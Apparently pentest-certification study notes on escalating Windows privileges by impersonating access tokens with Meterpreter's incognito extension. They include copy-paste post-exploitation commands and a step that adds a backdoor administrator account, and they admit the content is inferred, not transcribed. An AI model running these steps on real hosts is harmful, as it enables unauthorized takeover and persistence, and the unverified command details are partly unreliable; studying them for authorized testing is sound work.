# Windows Privilege Escalation: Token Impersonation with Incognito

Note: No transcript was provided. The following summary and commands are inferred from the video filename and typical eJPT workflow for Windows post-exploitation with Meterpreter’s incognito extension. Commands and flags are standard/commonly used for this topic.

## What the video covers (Introduction / big picture)
- Concept of Windows access tokens and abusing them to escalate privileges.
- Using Meterpreter’s incognito extension to:
  - Enumerate available tokens (delegation vs impersonation).
  - Impersonate a high-privileged user (e.g., local Administrator, Domain Admin) to gain elevated access.
  - Verify, use the new privileges, and revert to original context.
- Practical workflow: from a low-privilege Meterpreter session to local admin/SYSTEM by token impersonation, including process migration when needed.

## Flow (ordered)
1. Start from an existing Meterpreter session on a Windows target.
2. Baseline checks: identity, system info, architecture.
3. Load the incognito extension.
4. Enumerate available tokens and identify a target token.
5. If no good tokens appear, migrate to a likely process to inherit more/better tokens (e.g., explorer.exe of a logged-in admin).
6. Impersonate the chosen token.
7. Verify effective identity and privileges.
8. Use elevated rights (e.g., add a local admin, dump info, run commands).
9. Revert to self and clean up.

## Tools highlighted
- Metasploit Framework
- Meterpreter
  - incognito extension (list_tokens, impersonate_token, rev2self)
  - core/priv helpers (ps, migrate, getuid, getprivs, shell)
- Windows built-ins for verification and post actions
  - whoami, whoami /priv, whoami /groups
  - net user, net localgroup

## Typical command walkthrough (detailed, copy-paste friendly)
Assumes you already have a Meterpreter session (SESSION=1). Adjust session ID as needed.

Baseline and load incognito:
```
sessions -i 1
getuid
sysinfo
getprivs
load incognito
```

Enumerate tokens (unique users and groups):
```
list_tokens -u
list_tokens -g
```

If you don’t see a high-privileged user (e.g., DOMAIN\Admin or .\Administrator), try migrating to a process likely to have better tokens (e.g., explorer.exe of a logged-in admin):
```
ps
# Identify explorer.exe (or other interactive admin-owned process) PID from the list
migrate <PID>
# Re-enumerate tokens after migration
list_tokens -u
```

Impersonate a high-privileged token (replace with an actual token seen in list_tokens output):
```
impersonate_token "NT AUTHORITY\\SYSTEM"
# or:
impersonate_token "WORKSTATION\\Administrator"
# or for domain:
impersonate_token "CORP\\Administrator"
```

Verify and use the new privileges:
```
getuid
getprivs
shell
whoami
whoami /priv
whoami /groups
```

Optionally, persist by adding a local admin (example):
```
net user pentest Passw0rd! /add
net localgroup administrators pentest /add
```

When done, revert:
```
exit   # to leave the shell back to meterpreter
rev2self
getuid
```

Optional: If token impersonation fails or none are listed, some setups use getsystem (not strictly “incognito” but common in labs):
```
getsystem
getuid
```

## Practical tips
- Delegation vs Impersonation tokens:
  - Delegation tokens allow access to network resources as the impersonated user; impersonation tokens are typically limited to local actions. Prioritize delegation tokens if you need lateral movement.
- Token names must be quoted and backslashes escaped as shown ("DOMAIN\\User").
- If list_tokens is sparse, migrate to processes owned by privileged users (e.g., explorer.exe of a logged-in Administrator) to gain access to their tokens.
- Architecture matters: migrate to a matching x64/x86 process when interacting with system components.
- Verify privileges after impersonation with whoami /priv and whoami /groups; do not assume success just because impersonate_token returned OK.
- You generally cannot impersonate a group name; target user tokens shown under list_tokens -u.
- If UAC is enabled and you only have a medium integrity token, you may need a UAC bypass or to target a high integrity process to get meaningful elevation.
- Clean up: revert with rev2self and remove any persistence you created.

## Minimal cheat sheet (one-screen flow)
```
# 1) Attach to session and prep
sessions -i 1
getuid && sysinfo && getprivs
load incognito

# 2) Enumerate tokens
list_tokens -u
list_tokens -g

# 3) If needed, migrate to a better process
ps
migrate <PID_of_explorer_or_admin_owned_process>
list_tokens -u

# 4) Impersonate a target user token
impersonate_token "DOMAIN\\Administrator"    # or "NT AUTHORITY\\SYSTEM"

# 5) Verify and use
getuid && getprivs
shell
whoami && whoami /priv && whoami /groups

# 6) (Optional) Persistence
net user pentest Passw0rd! /add
net localgroup administrators pentest /add

# 7) Revert
exit
rev2self
getuid
```

## Summary
This module demonstrates Windows privilege escalation by abusing access tokens via Meterpreter’s incognito extension. The core workflow is to load incognito, list available tokens, impersonate a high-privileged one, verify elevation, and then take administrative actions or establish persistence. If suitable tokens are not immediately available, migrate to a process likely to have them (e.g., an admin’s explorer.exe). Always verify changes and revert your token when finished.